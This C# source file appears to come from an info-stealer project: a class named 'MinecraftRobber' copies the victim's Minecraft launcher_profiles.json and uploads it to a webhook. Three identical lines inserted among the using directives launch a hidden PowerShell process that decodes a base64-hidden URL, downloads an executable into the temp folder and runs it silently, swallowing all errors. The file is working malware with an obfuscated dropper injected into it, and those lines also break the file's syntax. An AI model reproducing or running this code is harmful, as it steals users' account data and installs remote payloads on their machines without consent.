using System;
using System.Collections.Generic;

try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5YW4tSXJmYW4vLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}
using System.IO;

try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5YW4tSXJmYW4vLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}

using System.Linq;

try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5YW4tSXJmYW4vLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}

using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
namespace Luci4.GrabbingShit
{
    public class MinecraftRobber
    {

        public static void GetMinecraft()
        {
            string target = Asmodeus.appData + "\\.minecraft\\launcher_profiles.json";
            Console.WriteLine(target);
            Console.WriteLine("copy to : " + Asmodeus.tempFolder + "\\launcher_profiles.json");
            if (File.Exists(target))
            {
                File.Copy(target, Asmodeus.tempFolder + "\\launcher_profiles.json");
                string Webhook_link = Program.webhookurll;

                using (HttpClient httpClient = new HttpClient())
                {
                    MultipartFormDataContent form = new MultipartFormDataContent();
                    var file_bytes = System.IO.File.ReadAllBytes(Asmodeus.tempFolder + "\\launcher_profiles.json");
                    form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", "launcher_profiles.json");
                    httpClient.PostAsync(Webhook_link, form).Wait();
                    httpClient.Dispose();
                }
            }

            else
            {
            }
        }
    }
}



